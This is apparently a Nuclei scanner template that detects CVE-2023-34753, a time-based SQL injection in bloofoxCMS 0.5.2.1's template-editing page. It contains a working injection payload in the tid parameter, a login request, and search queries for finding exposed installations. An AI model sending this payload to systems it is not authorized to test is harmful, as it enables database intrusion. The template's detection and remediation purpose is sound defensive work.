http:
- matchers:
  - condition: and
    dsl:
    - duration>=6
    - contains(header_2, "text/html")
    - contains(body_2, 'bloofoxCMS Admincenter')
    type: dsl
  matchers-condition: and
  raw:
  - 'POST /admin/index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&password={{password}}&action=login

    '
  - '@timeout: 10s

    POST /admin/index.php?mode=settings&page=tmpl&action=edit HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    name=default&template=default.html&css=default.css&template_print=print.html&template_print_css=print.css&template_login=login.html&template_text=text.html&be=0&tid=''+AND+(SELECT+7401+FROM+(SELECT(SLEEP(6)))hwrS)--+&send=Save

    '
id: CVE-2023-34753
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:bloofox:bloofoxcms:0.5.2.1:*:*:*:*:*:*:*
    cve-id: CVE-2023-34753
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.96742
    epss-score: 0.33243
  description: 'bloofox v0.5.2.1 was discovered to contain a SQL injection vulnerability
    via the tid parameter at admin/index.php?mode=settings&page=tmpl&action=edit.

    '
  impact: 'Authenticated attackers can exploit SQL injection through the tid parameter
    in the template settings page to extract database contents, manipulate CMS data,
    and potentially execute commands on the underlying database server.

    '
  metadata:
    fofa-query:
    - Powered by bloofoxCMS
    - powered by bloofoxcms
    max-request: 2
    product: bloofoxcms
    vendor: bloofox
    verified: 'true'
  name: bloofoxCMS v0.5.2.1 - SQL Injection
  reference:
  - https://www.bloofox.com
  - https://ndmcyb.hashnode.dev/bloofox-v0521-was-discovered-to-contain-many-sql-injection-vulnerability
  - https://nvd.nist.gov/vuln/detail/CVE-2023-34753
  remediation: 'Update bloofoxCMS to a version newer than 0.5.2.1 that uses parameterized
    queries or prepared statements for the tid parameter in admin/index.php template
    editing functionality.

    '
  severity: critical
  tags: time-based-sqli,cve,cve2023,sqli,bloofox,authenticated,vuln
